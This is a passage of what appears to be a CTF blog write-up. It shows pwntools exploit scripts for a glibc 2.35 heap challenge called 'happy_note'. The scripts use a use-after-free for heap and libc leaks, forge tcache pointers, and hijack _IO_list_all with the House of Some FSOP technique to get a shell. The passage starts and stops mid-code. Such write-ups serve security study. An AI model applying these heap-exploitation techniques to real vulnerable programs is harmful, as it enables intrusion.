sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">uaf(<span class="number">11</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak heap_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">heap_base = u64(show(<span class="number">11</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PROTECT_PTR</span>(<span class="params">ptr, pos</span>):</span></span><br><span class="line">    <span class="comment">#return (heap_base &gt;&gt; 12) ^ ptr</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak libc_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x200</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk5=*(size_t*)$rebase(0x40c8)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk4=*(size_t*)$rebase(0x40c0)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># chunk 6 =&gt; unsortedbin</span></span><br><span class="line">                                                <span class="comment"># fakechunk =&gt; heap_base + 0x1280</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># todo: rewrite chunk5 =&gt; heap_base + 0x1070</span></span><br><span class="line">delete(<span class="number">7</span>)   <span class="comment"># split top_chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1280</span>, heap_base)))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;9&#x27;</span> * <span class="number">0x78</span>)    <span class="comment"># calloc =&gt; &#x27;9&#x27; * 0x78 + chunk6-&gt;bk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.35-debug.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span> - <span class="number">0x39000</span></span><br><span class="line">    <span class="comment"># https://libc.blukat.me/d/libc6_2.35-0ubuntu3_amd64.so</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc6_2.35-0ubuntu3_amd64.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base) = &#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;arbitrary write&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1070</span>, heap_base)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">libc_iolist = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;8&#x27; * 0x60</span></span><br><span class="line"><span class="string">0      size</span></span><br><span class="line"><span class="string">iolist tcache_key</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;8&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>) + p64(PROTECT_PTR(libc_iolist - <span class="number">0x10</span>, heap_base+<span class="number">0x1000</span>)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk4 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># heap_base + 0x10f0</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># _IO_list_all - 0x10 (e-&gt;key)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;house of some 1&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">from</span> SomeofHouse <span class="keyword">import</span> HouseOfSome</span><br><span class="line">fake_file_start = libc_iolist + <span class="number">0x10</span> + <span class="number">0xe0</span> + <span class="number">0xe8</span></span><br><span class="line">hos = HouseOfSome(libc=libc, controled_addr=fake_file_start)</span><br><span class="line">payload = hos.hoi_read_file_template(fake_file_start, <span class="number">0x400</span>, fake_file_start, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">len</span>(payload) = &#125;</span>&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(libc_iolist + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    <span class="comment">#AUTOGDB and g.execute(&#x27;p *(struct _IO_FILE_plus *)_IO_list_all&#x27;) and sleep(T)</span></span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p *(struct _IO_FILE_plus *)$rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &amp;_IO_list_all&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p _IO_list_all&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="comment">#AUTOGDB and g.execute(&#x27;b *$rebase(0x14f6)&#x27;) and sleep(T)</span></span><br><span class="line"><span class="comment">#AUTOGDB and g.execute(&#x27;b _IO_flush_all_lockp&#x27;) and sleep(T)</span></span><br><span class="line"><span class="comment">#AUTOGDB and g.execute(&#x27;b _IO_new_file_finish&#x27;) and sleep(T)</span></span><br><span class="line">delete(<span class="number">3</span>)   <span class="comment"># exit</span></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;empty!\n&#x27;</span>)</span><br><span class="line">hos.bomb(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
<h2 id="手动House-of-Some-1的Exp">手动House of Some 1的Exp<a class="anchor" href="#手动House-of-Some-1的Exp">·</a></h2>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;bash&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">T = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line">AUTOGDB = <span class="literal">True</span></span><br><span class="line">DEBUG = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    env = &#123;<span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;</span><br><span class="line">    r = process(<span class="string">&#x27;./happy_note&#x27;</span>, env=env)</span><br><span class="line">    <span class="keyword">if</span> AUTOGDB:</span><br><span class="line">        gid, g = gdb.attach(r, api=<span class="literal">True</span>, gdbscript=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;dir ./src&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">        AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;c&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(r, gdbscript=<span class="string">&#x27;dir ./src&#x27;</span>)</span><br><span class="line">        <span class="built_in">input</span>(<span class="string">&#x27;Waiting GDB...&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    AUTOGDB = <span class="literal">False</span></span><br><span class="line">    r = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28208</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, mode=<span class="number">1</span></span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Note size:&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a mode: [1] or [2]&#x27;</span>, <span class="built_in">str</span>(mode).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Which one do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> r.recvline()[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;Edit your content:&#x27;</span>, content)</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Choose a note:&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    sleep(T)</span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;fastbin attack and uaf&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x78</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">uaf(<span class="number">11</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak heap_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">heap_base = u64(show(<span class="number">11</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(heap_base) = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">PROTECT_PTR</span>(<span class="params">ptr, pos</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;leak libc_base&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x200</span>)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk5=*(size_t*)$rebase(0x40c8)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;set $chunk4=*(size_t*)$rebase(0x40c0)-0x10&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># chunk 6 =&gt; unsortedbin</span></span><br><span class="line">                                                <span class="comment"># fakechunk =&gt; heap_base + 0x1280</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x190</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>))   <span class="comment"># todo: rewrite chunk5 =&gt; heap_base + 0x1070</span></span><br><span class="line">delete(<span class="number">7</span>)   <span class="comment"># split top_chunk</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1280</span>, heap_base)))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, <span class="string">b&#x27;9&#x27;</span> * <span class="number">0x78</span>)    <span class="comment"># calloc =&gt; &#x27;9&#x27; * 0x78 + chunk6-&gt;bk</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk5 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc-2.35-debug.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc_base = u64(show(<span class="number">9</span>)[<span class="number">0x78</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1e0ce0</span> - <span class="number">0x39000</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc6_2.35-0ubuntu3_amd64.so&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base) = &#125;</span>&#x27;</span>)</span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;hijack stdout&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">edit(<span class="number">11</span>, p64(PROTECT_PTR(heap_base + <span class="number">0x1070</span>, heap_base)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x78</span>)   <span class="comment"># chunk10 == chunk11 (pointer)</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x78</span>)    <span class="comment"># fake_chunk</span></span><br><span class="line"></span><br><span class="line">libc_iolist = libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;8&#x27; * 0x60</span></span><br><span class="line"><span class="string">0      size</span></span><br><span class="line"><span class="string">stdout tcache_key</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;8&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x211</span>) + p64(PROTECT_PTR(libc_iolist - <span class="number">0x10</span>, heap_base+<span class="number">0x1000</span>)))</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;hexdump $chunk4 0x500&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;bins&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="number">2</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, <span class="number">2</span>)    <span class="comment"># _IO_list_all - 0x10 (e-&gt;key)</span></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;x/12gx $rebase(0x40a0)&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTOGDB <span class="keyword">and</span> g.execute(<span class="string">&#x27;p &quot;house of some 1&quot;&#x27;</span>) <span class="keyword">and</span> sleep(T)</span><br><span class="line">libc_IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">libc_environ = libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span 